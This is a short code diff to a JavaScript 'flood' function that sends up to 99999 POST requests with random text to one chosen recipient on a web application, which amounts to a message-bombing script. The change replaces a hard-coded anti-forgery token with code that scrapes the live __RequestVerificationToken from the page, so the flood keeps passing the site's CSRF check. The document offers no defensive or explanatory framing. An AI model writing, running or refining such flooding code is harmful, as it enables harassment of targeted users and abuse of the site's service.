@@ -33,6 +33,7 @@ function flood(size) {
   }
 
   size = Number(size) || 99999;
+  var token = $('script:last').text().replace(/ /g, '').replace(/\n/g, '').replace(/.*value="/, '').replace(/".*/, '');
   for (var i = 0; i < size; i++) {
     var text = getRandomText();
     var userId = $('#RecipientId').val();
@@ -42,7 +43,7 @@ function flood(size) {
       type: 'POST',
       cache: false,
       data: {
-        __RequestVerificationToken: $('<input name="__RequestVerificationToken" type="hidden" value="CfDJ8MQSRebrM95Pv2f7WNJmKQUGRP_XP4kyCrel7XcG_lTOn5nRfdQnzpP2D35GKFT9pr0_3d1oaI5LSgMDkgyV-AYR9e6zD3yJC7FEepvEC4dKP_m0_nx8urZaSrVAWaMJUiJDsJOFATHypd__6yfn3Nw" />').attr('value'),
+        __RequestVerificationToken: token,
         userId: userId,
         text: text
       },
